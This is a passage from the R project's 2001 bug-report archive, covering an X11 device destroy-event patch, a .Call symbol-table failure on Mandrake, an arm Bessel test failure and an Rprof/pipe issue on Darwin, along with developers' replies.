X-Authentication-Warning: infiniti.ece.cmu.edu: tov set sender to tov@ece.cmu.edu using -f
Sender: tov@infiniti.ece.cmu.edu
To: r-bugs@r-project.org
Cc: Thomas Vogels <tov@ece.cmu.edu>
Subject: X11 device doesn't handle destroy events correcly
Reply-To: Thomas Vogels <tov@ece.cmu.edu>
X-URI: http://www.ece.cmu.edu/~tov
From: Thomas Vogels <tov@ece.cmu.edu>
Date: 13 Feb 2001 17:40:46 -0500
Message-ID: <px3ddi6wb5.fsf@infiniti.ece.cmu.edu>
Lines: 258
User-Agent: Gnus/5.0807 (Gnus v5.8.7) Emacs/20.7
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii


Hi, there are two problems in devX11.c.  The one is an undocumented
nuisance and the other isn't a bug until you try to embed an X11
device in another window (think tktoplevel() in tcltk package...).

Let's take a look at locator() first: Assuming you call locator() with
a current X11 device, this call is handled in X11_Locator
(src/unix/X11/devX11.c).  When you have one window open and call
locator, you have three options to quit the locator: click Button 1
(to locate), click Button 2 (to abort), or destroy the window.  The
later results in the error message: "Error in locator(1) : No graphics
device is active". That's OK, sort of.

This gets problematic when you open two windows:
> x11()  # assume that's device 2
> x11()  # assume that's device 3
> plot(1)
> locator(1)  # with device 3 == dev.cur()!

When you now destroy device 3 (where locator expects the click), you have
*no alternative but to close _all_ windows* to abort the locator.  The
locator continues to wait for mouse clicks in device 3 where of course
no further clicks can come from.  That's the nuisance part.

The second problem is that the device may try to plot() into a
non-existant window.  Assume that the window was destroyed by some
other part of the program.  The device (at some point in the future)
will receive a DestroyNotify event that handleEvent ignores.
Blissfully!  *No KillDevice is called* when the window is destroyed by
something other than the WM_DELETE_WINDOW mechanism!  This happens
when you embed the X11 device into another window/application.  For
starters, the device no longer receives WM_DELETE_WINDOW client
messages.  But it does receive a DestroyNotify event when the parent
(the container window) is destroyed.  HandleEvent should, well
_handle_ this _event_.

The patch below is a _suggestion_ how to solve both problems.  It is
against the current r-devel, 1.3, as of 2/13.  I believe this behavior
exists in version 1.2 as well and can be solved there the same way.
The patch is just meant as a convenient and concise way to describe
my suggestion.  I'd greatly appreciate feedback or other ideas!

Implementation:

-- the variable inclose is now in the device specific structure (why
   was it global?)  After the window is mapped, inclose is TRUE until
   the window is destroyed explicitly or a DestroyNotify event has been
   received.
-- the deviceSpecific pointer is set to NULL after the memory has been
   freed. This (side?) effect is used in X11_Locator to detect the
   closing of the current device  which _must_ lead to an error.
-- the if statement to handle events of type DestroyEvent is added to 
   handleEvent
-- when the user closes the device (dev.off()), the window is
   destroyed in X11_Close
-- when the user pushes the close button in the window frame, the
   window is destroyed in handleEvent and X11_Close is initiated
   (the WM_DELETE_WINDOW mechanism already in place.)
-- when the window is destroyed for another reason (e.g. the parent
   being destroyed), it is not destroyed again but X11_Close is still
   initiated.

Regards,
  -tom


--------------------------------------------------
*** devX11.c_orig	Tue Feb 13 15:32:24 2001
--- devX11.c	Tue Feb 13 17:24:04 2001
***************
*** 116,121 ****
--- 116,122 ----
      FILE *fp;				/* file for a bitmap device */
      int quality;			/* JPEG quality */
  
+     Rboolean inclose;                   /* TRUE if window is being closed */
  } x11Desc;
  
  
***************
*** 145,151 ****
  static Atom _XA_WM_PROTOCOLS, protocol;
  
  static Rboolean displayOpen = FALSE;
- static Rboolean inclose = FALSE;
  static int numX11Devices = 0;
  
  	/********************************************************/
--- 146,151 ----
***************
*** 619,632 ****
  	xd->windowHeight = event.xconfigure.height;
  	xd->resize = 1;
      }
      else if ((event.type == ClientMessage) &&
! 	     (event.xclient.message_type == _XA_WM_PROTOCOLS))
! 	if (!inclose && event.xclient.data.l[0] == protocol) {
! 	    XFindContext(display, event.xclient.window,
  			 devPtrContext, &temp);
  	    dd = (DevDesc *) temp;
! 	    KillDevice(dd);
  	}
  }
  
  static void R_ProcessEvents(void *data)
--- 619,652 ----
  	xd->windowHeight = event.xconfigure.height;
  	xd->resize = 1;
      }
+     else if (event.type == DestroyNotify) {
+         /* The window is being destroyed, kill the device, too. */
+         XFindContext(display, event.xdestroywindow.window,
+                      devPtrContext, &temp);
+         dd = (DevDesc *) temp;
+         xd = (x11Desc *) dd->deviceSpecific;
+         if (!xd->inclose) {
+             xd->inclose = TRUE;
+             KillDevice(dd);
+         }
+     }
      else if ((event.type == ClientMessage) &&
! 	     (event.xclient.message_type == _XA_WM_PROTOCOLS)) {
! 	if (event.xclient.data.l[0] == protocol) {
!             XFindContext(display, event.xclient.window,
  			 devPtrContext, &temp);
  	    dd = (DevDesc *) temp;
! 	    xd = (x11Desc *) dd->deviceSpecific;
! 	    if (!xd->inclose) {
! 		/* Dispatch destroy only once */
! 		xd->inclose = TRUE;
! 		XDestroyWindow(display, xd->window);
! 		XSync (display, 0);
! 		KillDevice(dd);
! 	    }
  	}
+     }
+ 
  }
  
  static void R_ProcessEvents(void *data)
***************
*** 1208,1213 ****
--- 1228,1234 ----
  		     ExposureMask | ButtonPressMask | StructureNotifyMask);
  	XMapWindow(display, xd->window);
  	XSync(display, 0);
+         xd->inclose = FALSE;
  
  	/* Gobble expose events */
  
***************
*** 1464,1476 ****
      x11Desc *xd = (x11Desc *) dd->deviceSpecific;
  
      if (xd->type == WINDOW) {
! 	/* process pending events */
! 	/* set block on destroy events */
! 	inclose = TRUE;
  	R_ProcessEvents((void*) NULL);
  
  	XFreeCursor(display, xd->gcursor);
- 	XDestroyWindow(display, xd->window);
  	XSync(display, 0);
      } else {
  	if (xd->npages && xd->type != XIMAGE) {
--- 1485,1506 ----
      x11Desc *xd = (x11Desc *) dd->deviceSpecific;
  
      if (xd->type == WINDOW) {
! 	/* There are three reasons to be here: */
! 	/* 1) The user clicked on a button in the window frame */
! 	/*    and we received a DELETE_WINDOW from the wm, */
! 	/* 2) Somebody destroyed our window directly, or if */
! 	/*    embedded, the parent is being destroyed, and so */
! 	/*    we got a DestroyNotify event, too, */
! 	/* 3) The user used dev.off() to get rid of us. Bye. */
! 
! 	if (!xd->inclose) {
! 	    xd->inclose = TRUE;
! 	    XDestroyWindow(display, xd->window);
! 	}
! 	/* process pending events (esp. reap events for this window) */
  	R_ProcessEvents((void*) NULL);
  
  	XFreeCursor(display, xd->gcursor);
  	XSync(display, 0);
      } else {
  	if (xd->npages && xd->type != XIMAGE) {
***************
*** 1517,1523 ****
      }
  
      free(xd);
!     inclose = FALSE;
  }
  
  	/********************************************************/
--- 1547,1553 ----
      }
  
      free(xd);
!     dd->deviceSpecific = NULL;
  }
  
  	/********************************************************/
***************
*** 1858,1866 ****
  		else
  		    done = 2;
  	    }
! 	}
! 	else
  	    handleEvent(event);
      }
      /* if it was a Button1 succeed, otherwise fail */
      return (done == 1);
--- 1888,1901 ----
  		else
  		    done = 2;
  	    }
! 	} else {
  	    handleEvent(event);
+ 	    if (!dd->deviceSpecific) {
+ 		/* Allow new active window to redraw */
+ 		R_ProcessEvents((void*)NULL);
+ 		error ("Device closed while waiting for input.\n");
+ 	    }
+         }
      }
      /* if it was a Button1 succeed, otherwise fail */
      return (done == 1);
--------------------------------------------------




--please do not edit the information below--

Version:
 platform = i686-pc-linux-gnu
 arch = i686
 os = linux-gnu
 system = i686, linux-gnu
 status = Under development (unstable)
 major = 1
 minor = 3.0
 year = 2001
 month = 02
 day = 12
 language = R

Search Path:
 .GlobalEnv, package:ctest, Autoloads, package:base


-- 
mailto:tov@ece.cmu.edu (Tom Vogels)   Tel: (412) 268-6638   FAX: -3204


==> 848.followup.1 <==
From pd@biostat.ku.dk  Wed Feb 14 01:10:35 2001
Received: from biostat.ku.dk (blueberry [130.225.108.193])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id BAA10968;
	Wed, 14 Feb 2001 01:10:34 +0100 (MET)
Received: (from pd@localhost)
	by biostat.ku.dk (8.9.3/8.9.3) id BAA02066;
	Wed, 14 Feb 2001 01:11:56 +0100
Sender: pd@blueberry.kubism.ku.dk
To: tov@ece.cmu.edu
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: [Rd] X11 device doesn't handle destroy events correcly (PR#848)
References: <200102132240.XAA10562@pubhealth.ku.dk>
From: Peter Dalgaard BSA <p.dalgaard@pubhealth.ku.dk>
Date: 14 Feb 2001 01:11:56 +0100
In-Reply-To: tov@ece.cmu.edu's message of "Tue, 13 Feb 2001 23:40:37 +0100 (MET)"
Message-ID: <x2elx2yvg3.fsf@blueberry.kubism.ku.dk>
Lines: 25
X-Mailer: Gnus v5.7/Emacs 20.7
Mime-Version: 1.0
Content-Type: text/plain; charset=US-ASCII
Content-Transfer-Encoding: 7bit

tov@ece.cmu.edu writes:


> Blissfully!  *No KillDevice is called* when the window is destroyed by
> something other than the WM_DELETE_WINDOW mechanism!  This happens
> when you embed the X11 device into another window/application.  For
> starters, the device no longer receives WM_DELETE_WINDOW client
> messages.  But it does receive a DestroyNotify event when the parent
> (the container window) is destroyed.  HandleEvent should, well
> _handle_ this _event_.

Heh. Quite probably, this is also the source of the FVWM trouble
reported earlier although that triggered an infinite loop which should
probably be guarded against by other means as well. 

Thanks for filing this (good to have as bug report so that we don't
forget - it's the sort of thing that often has to wait until someone
has a clear enough mind and sufficient stamina to try and get it
right.)

-- 
   O__  ---- Peter Dalgaard             Blegdamsvej 3  
  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
 (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907

==> 848.audit <==
Sat Feb 17 11:44:41 2001	ripley	moved from incoming to System-specific
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1020 *
Subject: .Call and Mandrake 8.0
From: lcottret@yahoo.fr
Date: Wed, 11 Jul 2001 15:34:23 +0200 (MET DST)
--problem with symbol names only on Mandrake 8.0, not 7.2
--needs reply to follow-up
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1020 <==
From lcottret@yahoo.fr  Wed Jul 11 15:34:24 2001
Received: from blueberry.kubism.ku.dk (blueberry [130.225.108.193])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id PAA16374
	for <R-bugs@biostat.ku.dk>; Wed, 11 Jul 2001 15:34:23 +0200 (MET DST)
Date: Wed, 11 Jul 2001 15:34:23 +0200 (MET DST)
From: lcottret@yahoo.fr
Message-Id: <200107111334.PAA16374@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: .Call and Mandrake 8.0

Full_Name: Ludovic Cottret
Version: R 1.3.0
OS: Linux
Submission from: (NULL) (157.136.20.138)


I have a R function which call a C function by the instruction ".Call".
The first time I call the R function in a R session, it perfectly runs. But the
next 
times, R returns this error message :

Error in .Call("", bankpath, accn, indexpath, key, beg, end) :
        .Call function name not in load table

The function name has disappeared !!
This function well runs on Mandrake 7.2 but not in Mandrake 8.0. Why ?!?

Thanks for your answers...
PS : Excuse my poor english...




==> 1020.followup.1 <==
From duncan@jessie.research.bell-labs.com  Wed Jul 11 16:15:16 2001
Received: from crufty.research.bell-labs.com (crufty.research.bell-labs.com [204.178.16.49])
	by pubhealth.ku.dk (8.9.3/8.9.1) with SMTP id QAA16686
	for <R-bugs@biostat.ku.dk>; Wed, 11 Jul 2001 16:15:15 +0200 (MET DST)
Received: from scummy.research.bell-labs.com ([135.104.2.10]) by crufty; Wed Jul 11 10:10:04 EDT 2001
Received: from jessie.research.bell-labs.com ([135.104.13.5]) by scummy; Wed Jul 11 10:13:33 EDT 2001
Received: (from duncan@localhost)
	by jessie.research.bell-labs.com (8.9.1/8.9.1) id KAA02731;
	Wed, 11 Jul 2001 10:13:07 -0400 (EDT)
Date: Wed, 11 Jul 2001 10:13:07 -0400
From: Duncan Temple Lang <duncan@research.bell-labs.com>
To: lcottret@yahoo.fr
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: [Rd] .Call and Mandrake 8.0 (PR#1020)
Message-ID: <20010711101307.E24919@jessie.research.bell-labs.com>
Mail-Followup-To: lcottret@yahoo.fr, r-devel@stat.math.ethz.ch,
	R-bugs@biostat.ku.dk
References: <200107111334.PAA16384@pubhealth.ku.dk>
Mime-Version: 1.0
Content-Type: text/plain; charset=us-ascii
X-Mailer: Mutt 1.0us
In-Reply-To: <200107111334.PAA16384@pubhealth.ku.dk>; from lcottret@yahoo.fr on Wed, Jul 11, 2001 at 03:34:25PM +0200

Hi Ludovic.

 There are at least two possible explanations for this behaviour.

  1)  There is a bug in the recently changed code in R to find 
     routines in C and Fortran libraries.

  2)  The routine that you are .Call()'ing is doing something
  that has confused the R internals and makes the next R commands
  not work, and potentially this is not reproducible.

If this is not proprietary or confidential code, you can send the C
code and instructions as to how to call it from R (that is, provide
simple values for the bankpath, accn, indexpath, key, beg and end
arguments), then I can see if the computations are potentially
writing over other values in memory.

Also, you can try a invoking a very simple .Call() routine 
many times to see if that displays the same failure. For example,
put the following C code in a file named simpleCall.c

#include "Rinternals.h"

SEXP
simpleCall() 
{
  static int count = 0;
  SEXP ans;

  PROTECT(ans = allocVector(INTSXP, 1));
  INTEGER(ans)[0] = count++;

  UNPROTECT(1);
  return(ans);
}

Then, compile this with 
  R CMD SHLIB simpleCall.c

and call it from R in the following way

 > dyn.load("simpleCall.so")
 > for(i in 1:10) { print(.Call("simpleCall")) }

If this works, it won't determine whether it is 1) or 2) (or any other
possible reason), but if it doesn't work, we will have a lot more
information.

 Thanks,
   Duncan


lcottret@yahoo.fr wrote:
> Full_Name: Ludovic Cottret
> Version: R 1.3.0
> OS: Linux
> Submission from: (NULL) (157.136.20.138)
> 
> 
> I have a R function which call a C function by the instruction ".Call".
> The first time I call the R function in a R session, it perfectly runs. But the
> next 
> times, R returns this error message :
> 
> Error in .Call("", bankpath, accn, indexpath, key, beg, end) :
>         .Call function name not in load table
> 
> The function name has disappeared !!
> This function well runs on Mandrake 7.2 but not in Mandrake 8.0. Why ?!?
> 
> Thanks for your answers...
> PS : Excuse my poor english...
> 
> 
> 
> 
> -.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-
> r-devel mailing list -- Read http://www.ci.tuwien.ac.at/~hornik/R/R-FAQ.html
> Send "info", "help", or "[un]subscribe"
> (in the "body", not the subject !)  To: r-devel-request@stat.math.ethz.ch
> _._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._

-- 
_______________________________________________________________

Duncan Temple Lang                duncan@research.bell-labs.com
Bell Labs, Lucent Technologies    office: (908)582-3217
700 Mountain Avenue, Room 2C-259  fax:    (908)582-3340
Murray Hill, NJ  07974-2070       
         http://cm.bell-labs.com/stat/duncan

==> 1020.audit <==
Fri Aug  3 11:33:04 2001	ripley	changed notes
Fri Aug  3 11:33:04 2001	ripley	foobar
Fri Aug  3 11:33:04 2001	ripley	moved from incoming to System-specific
Tue Aug  7 08:37:20 2001	ripley	changed notes
Tue Aug  7 08:37:20 2001	ripley	foobar

==> 1020.followup.2 <==
From mikalzet@libero.it  Fri Dec  7 12:44:05 2001
Received: from smtp3.libero.it (smtp3.libero.it [193.70.192.53])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id MAA07110
	for <r-bugs@biostat.ku.dk>; Fri, 7 Dec 2001 12:44:04 +0100 (MET)
From: mikalzet@libero.it
Received: from localhost.localdomain (151.25.109.136) by smtp3.libero.it (6.0.032)
        id 3BD43E2500FA2042 for r-bugs@biostat.ku.dk; Fri, 7 Dec 2001 12:43:26 +0100
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by localhost.localdomain (Postfix) with ESMTP id 477AB1D9C
	for <r-bugs@biostat.ku.dk>; Fri,  7 Dec 2001 12:43:25 +0100 (CET)
Date: Fri, 7 Dec 2001 12:43:25 +0100 (CET)
X-X-Sender:  <mike@localhost.localdomain>
To: <r-bugs@biostat.ku.dk>
Subject: bug PR#1020
Message-ID: <Pine.LNX.4.33L2.0112071238100.3318-100000@localhost.localdomain>
Return-Receipt-To: mikalzet@libero.it
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII


Found it on the site.
I tried duncan's suggestion.

#include "Rinternals.h"

SEXP
simpleCall()
{
  static int count = 0;
  SEXP ans;

  PROTECT(ans = allocVector(INTSXP, 1));
  INTEGER(ans)[0] = count++;

  UNPROTECT(1);
  return(ans);
}


If I had read this before I could have checked on mandrake 8.0

Here is my output on mandrake 8.1:

> dyn.load("simpleCall.so")
> for(i in 1:10) { print(.Call("simpleCall")) }

[1] 0
[1] 1
[1] 2
[1] 3
[1] 4
[1] 5
[1] 6
[1] 7
[1] 8
[1] 9

for(i in 1:10) { print(.Call("simpleCall")) }

[1] 10
[1] 11
[1] 12
[1] 13
[1] 14
[1] 15
[1] 16
[1] 17
[1] 18
[1] 19

> for(i in 1:10) { print(.Call("simpleCall")) }

[1] 20
[1] 21
[1] 22
[1] 23
[1] 24
[1] 25
[1] 26
[1] 27
[1] 28
[1] 29

Seems ok ?

-- 
Michele Alzetta

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1097 *
Subject: R 1.3.1 fails 'make check' on arm in the Bessel example
From: Dirk Eddelbuettel <edd@debian.org>
Date: Thu, 20 Sep 2001 23:54:19 -0500
--This platform turned out to have badly broken FPU behaviour. Given up, at 
--least for now .
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1097 <==
From postmaster@franz.stat.wisc.edu  Fri Sep 21 06:54:31 2001
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id GAA13162
	for <r-bugs@biostat.ku.dk>; Fri, 21 Sep 2001 06:54:30 +0200 (MET DST)
Received: from sonny.eddelbuettel.com (really [64.195.36.229]) by franz.stat.wisc.edu
	via smail with esmtp (ident mail using rfc1413)
	id <m15kIKZ-000JJ6C@franz.stat.wisc.edu> (Debian Smail3.2.0.111)
	for <r-bugs@r-project.org>; Thu, 20 Sep 2001 23:54:27 -0500 (CDT) 
Received: from edd by sonny.eddelbuettel.com with local (Exim 3.32 #1 (Debian))
	id 15kIKS-0005EK-00
	for <r-bugs@r-project.org>; Thu, 20 Sep 2001 23:54:20 -0500
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Message-ID: <15274.51195.688109.743960@sonny.eddelbuettel.com>
Date: Thu, 20 Sep 2001 23:54:19 -0500
To: r-bugs@r-project.org
Subject: R 1.3.1 fails 'make check' on arm in the Bessel example
X-Mailer: VM 6.92 under 21.4 (patch 1) "Copyleft" XEmacs Lucid
From: Dirk Eddelbuettel <edd@debian.org>


Debian tries to build its packages on a variety of platforms.  The arm
platform compiled 0.90.1 (the last Debian release before the Debian package
required an Atlas library, something we no longer require) failed in 'make
check'. The log snippet follows; I traced this to the example(Bessel) code.
 
> matplot(nu, t(outer(xx,nu, besselI)), type = 'l', ylim = c(-50,200),
+         main = expression(paste("Bessel ",I[nu](x)," for fixed ", x,
+                                 ",  as ",f(nu))),
+         xlab = expression(nu))
Error in title(main = main, sub = sub, xlab = xlab, ylab = ylab, ...) :
        Metric information not yet available for this device
        In addition: Warning messages:
        1: Nonfinite axis limits [GScale(nan,nan,1, .); log=0]
        2: relative range of values = 9.0072e+15 * EPS, is small (axis 1).
        3: Nonfinite axis limits [GScale(-inf,inf,2, .); log=0]
        4: relative range of values = 9.0072e+15 * EPS, is small (axis 2).
        Execution halted

Casual inspection suggests that GScale(nan,nan,1, .) is probably
incorrect. Now, src/nmath/bessel* provide the Bessel functions but does this
reflect a potential libc bug in IEEE handling?

I have also asked on the debian-arm mailing list, but no result so far. I
have some access to an arm box and could compile small test cases if that
helped. 

Dirk 
 
--please do not edit the information below--
 
Version:
 platform = i386-pc-linux-gnu
 arch = i386
 os = linux-gnu
 system = i386, linux-gnu
 status =
 major = 1
 minor = 3.1
 year = 2001
 month = 08
 day = 31
 language = R
 
Search Path:
 .GlobalEnv, package:ctest, Autoloads, package:base


-- 
Better to have an approximate answer to the right question 
than a precise answer to the wrong question. -- John Tukey

==> 1097.audit <==
Fri Sep 21 07:46:37 2001	ripley	moved from incoming to System-specific
Fri Jun 14 18:10:49 2002	pd	changed notes
Fri Jun 14 18:10:49 2002	pd	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1140 *
Subject: Possible bug, Rprof() and scan(pipe())
From: Don MacQueen <macq@llnl.gov>
Date: Tue, 23 Oct 2001 13:50:26 -0700
--MacOS X: Doesn't happen on Solaris or Linux
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1140 <==
From macq@llnl.gov  Tue Oct 23 22:51:03 2001
Received: from smtp-2.llnl.gov (smtp-2.llnl.gov [128.115.250.82])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id WAA27064
	for <r-bugs@biostat.ku.dk>; Tue, 23 Oct 2001 22:51:02 +0200 (MET DST)
Received: from [128.115.153.6] (localhost [127.0.0.1])
	by smtp-2.llnl.gov (8.9.3/8.9.3/LLNL-gateway-1.0) with ESMTP id NAA16321
	for <r-bugs@biostat.ku.dk>; Tue, 23 Oct 2001 13:50:23 -0700 (PDT)
Mime-Version: 1.0
X-Sender: e556558@popgun.llnl.gov
Message-Id: <p05101015b7fb820c1d22@[128.115.153.6]>
Date: Tue, 23 Oct 2001 13:50:26 -0700
To: r-bugs@biostat.ku.dk
From: Don MacQueen <macq@llnl.gov>
Subject: Possible bug, Rprof() and scan(pipe())
Content-Type: text/plain; charset="us-ascii" ; format="flowed"

This looks like a bug?
Unable to use scan(pipe()) while profiling.
I have no idea whether this version of R violates the
    "do not use `Rprof' in an executable built for profiling"
warning in ?Rprof.

Thanks
-Don

>  version
          _
platform powerpc-apple-darwin1.4
arch     powerpc
os       darwin1.4
system   powerpc, darwin1.4
status   Patched
major    1
minor    3.1
year     2001
month    10
day      15
language R
>
>  foo <- scan(pipe('ls -1 | head -3'),what='')
Read 3 items
>  foo
[1] "README"      "RMfiles.dat" "RMfiles.tmp"
>  Rprof()
>  foo <- scan(pipe('ls -1 | head -3'),what='')
Read 0 items
>  foo
character(0)
>  Rprof(NULL)
>  foo <- scan(pipe('ls -1 | head -3'),what='')
Read 3 items
>

note, profiling does appear to be functional:
>  Rprof() ; hist(rnorm(10000)) ; Rprof(NULL)
>  system('R CMD Rprof Rprof.out')

Each sample represents 0.02 seconds.
Total run time: 0.1 seconds.

Total seconds: time spent in function and callees.
Self seconds: time spent in function alone.

    %       total       %       self
  total    seconds     self    seconds    name
100.00      0.10      0.00      0.00     "hist"
  60.00      0.06      0.00      0.00     "hist.default"
  40.00      0.04     40.00      0.04     "rnorm"
  40.00      0.04      0.00      0.00     "plot"
  40.00      0.04      0.00      0.00     "plot.histogram"
  20.00      0.02      0.00      0.00     "storage.mode<-"
  20.00      0.02     20.00      0.02     "X11"
  20.00      0.02      0.00      0.00     "paste"
  20.00      0.02      0.00      0.00     "rect"
  20.00      0.02      0.00      0.00     "plot.new"
  20.00      0.02     20.00      0.02     "seq.default"
  20.00      0.02      0.00      0.00     "seq"
  20.00      0.02     20.00      0.02     "par"

    %       self        %       total
  self     seconds    total    seconds    name
  40.00      0.04     40.00      0.04     "rnorm"
  20.00      0.02     20.00      0.02     "X11"
  20.00      0.02     20.00      0.02     "seq.default"
  20.00      0.02     20.00      0.02     "par"

-- 
--------------------------------------
Don MacQueen
Environmental Protection Department
Lawrence Livermore National Laboratory
Livermore, CA, USA
--------------------------------------

==> 1140.followup.1 <==
From ripley@stats.ox.ac.uk  Sun Nov  4 14:01:05 2001
Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id OAA21765
	for <R-bugs@biostat.ku.dk>; Sun, 4 Nov 2001 14:01:05 +0100 (MET)
Received: from gannet.stats (IDENT:root@gannet.stats [163.1.20.127])
	by toucan.stats.ox.ac.uk (8.9.0/8.9.0) with ESMTP id NAA06732;
	Sun, 4 Nov 2001 13:01:00 GMT
Received: from localhost (ripley@localhost)
	by gannet.stats (8.11.3/8.11.3) with ESMTP id fA4D0xv19084;
	Sun, 4 Nov 2001 13:00:59 GMT
X-Authentication-Warning: gannet.stats: ripley owned process doing -bs
Date: Sun, 4 Nov 2001 13:00:59 +0000 (GMT)
From: Prof Brian Ripley <ripley@stats.ox.ac.uk>
X-X-Sender:  <ripley@gannet.stats>
To: <macq@llnl.gov>
cc: <R-bugs@biostat.ku.dk>
Subject: Re: [Rd] Possible bug, Rprof() and scan(pipe()) (PR#1140)
In-Reply-To: <200110232051.WAA27074@pubhealth.ku.dk>
Message-ID: <Pine.LNX.4.31.0111041258370.19068-100000@gannet.stats>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

This does not happen on Solaris or Linux, so must be related to the use of
signals on darwin.

It probably means Rprof should be avoided on that platform, but the
porter (Jan de Leeuw) needs to investigate.


On Tue, 23 Oct 2001 macq@llnl.gov wrote:

> This looks like a bug?
> Unable to use scan(pipe()) while profiling.
> I have no idea whether this version of R violates the
>     "do not use `Rprof' in an executable built for profiling"
> warning in ?Rprof.
>
> Thanks
> -Don
>
> >  version
>           _
> platform powerpc-apple-darwin1.4
> arch     powerpc
> os       darwin1.4
> system   powerpc, darwin1.4
> status   Patched
> major    1
> minor    3.1
> year     2001
> month    10
> day      15
> language R
> >
> >  foo <- scan(pipe('ls -1 | head -3'),what='')
> Read 3 items
> >  foo
> [1] "README"      "RMfiles.dat" "RMfiles.tmp"
> >  Rprof()
> >  foo <- scan(pipe('ls -1 | head -3'),what='')
> Read 0 items
> >  foo
> character(0)
> >  Rprof(NULL)
> >  foo <- scan(pipe('ls -1 | head -3'),what='')
> Read 3 items
> >
>
> note, profiling does appear to be functional:
> >  Rprof() ; hist(rnorm(10000)) ; Rprof(NULL)
> >  system('R CMD Rprof Rprof.out')
>
> Each sample represents 0.02 seconds.
> Total run time: 0.1 seconds.
>
> Total seconds: time spent in function and callees.
> Self seconds: time spent in function alone.
>
>     %       total       %       self
>   total    seconds     self    seconds    name
> 100.00      0.10      0.00      0.00     "hist"
>   60.00      0.06      0.00      0.00     "hist.default"
>   40.00      0.04     40.00      0.04     "rnorm"
>   40.00      0.04      0.00      0.00     "plot"
>   40.00      0.04      0.00      0.00     "plot.histogram"
>   20.00      0.02      0.00      0.00     "storage.mode<-"
>   20.00      0.02     20.00      0.02     "X11"
>   20.00      0.02      0.00      0.00     "paste"
>   20.00      0.02      0.00      0.00     "rect"
>   20.00      0.02      0.00      0.00     "plot.new"
>   20.00      0.02     20.00      0.02     "seq.default"
>   20.00      0.02      0.00      0.00     "seq"
>   20.00      0.02     20.00      0.02     "par"
>
>     %       self        %       total
>   self     seconds    total    seconds    name
>   40.00      0.04     40.00      0.04     "rnorm"
>   20.00      0.02     20.00      0.02     "X11"
>   20.00      0.02     20.00      0.02     "seq.default"
>   20.00      0.02     20.00      0.02     "par"
>
> --
> --------------------------------------
> Don MacQueen
> Environmental Protection Department
> Lawrence Livermore National Laboratory
> Livermore, CA, USA
> --------------------------------------
>
> -.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-
> r-devel mailing list -- Read http://www.ci.tuwien.ac.at/~hornik/R/R-FAQ.html
> Send "info", "help", or "[un]subscribe"
> (in the "body", not the subject !)  To: r-devel-request@stat.math.ethz.ch
> _._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._
>

-- 
Brian D. Ripley,                  ripley@stats.ox.ac.uk
Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
University of Oxford,             Tel:  +44 1865 272861 (self)
1 South Parks Road,                     +44 1865 272860 (secr)
Oxford OX1 3TG, UK                Fax:  +44 1865 272595


==> 1140.followup.2 <==
From luke@nokomis.stat.umn.edu  Sun Nov  4 14:18:34 2001
Received: from nokomis.stat.umn.edu (root@nokomis.stat.umn.edu [134.84.86.39])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id OAA21858
	for <R-bugs@biostat.ku.dk>; Sun, 4 Nov 2001 14:18:33 +0100 (MET)
Received: (from luke@localhost)
	by nokomis.stat.umn.edu (8.11.3/8.10.2/SuSE Linux 8.10.0-0.3) id fA4DIOU10120;
	Sun, 4 Nov 2001 07:18:24 -0600
Date: Sun, 4 Nov 2001 07:18:24 -0600
From: Luke Tierney <luke@nokomis.stat.umn.edu>
To: ripley@stats.ox.ac.uk
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: [Rd] Possible bug, Rprof() and scan(pipe()) (PR#1140)
Message-ID: <20011104071824.A10053@nokomis.stat.umn.edu>
References: <200111041301.OAA21775@pubhealth.ku.dk>
Mime-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
User-Agent: Mutt/1.2.5i
In-Reply-To: <200111041301.OAA21775@pubhealth.ku.dk>; from ripley@stats.ox.ac.uk on Sun, Nov 04, 2001 at 02:01:10PM +0100

This feels like a system call restarting issue.  Some OS's restart
system calls after signals, others do not. For those that don't, low
level reads need to check for EINTR and such.  Connections use high
level reads, which should be insulated by the stdio library.  Possibly
dawrin's gets this wrong.  If strace is available you might be able to
tell that way.

luke

On Sun, Nov 04, 2001 at 02:01:10PM +0100, ripley@stats.ox.ac.uk wrote:
> This does not happen on Solaris or Linux, so must be related to the use of
> signals on darwin.
> 
> It probably means Rprof should be avoided on that platform, but the
